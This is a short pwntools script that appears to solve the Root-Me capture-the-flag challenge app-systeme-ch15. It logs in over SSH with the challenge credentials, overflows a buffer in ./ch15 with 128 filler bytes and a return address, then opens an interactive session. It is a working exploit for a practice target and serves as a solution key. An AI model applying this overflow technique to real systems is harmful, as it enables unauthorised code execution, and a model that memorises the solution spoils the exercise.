from pwn import *

host = "challenge02.root-me.org"

port = 2222

username = "app-systeme-ch15"
password = "app-systeme-ch15"

ssh_con = ssh(user=username,host=host,port=port,password=password)


p = ssh_con.process("./ch15")

payload = b'A' * 128 + p32(0x08048516)

p.sendline(payload)


p.interactive()


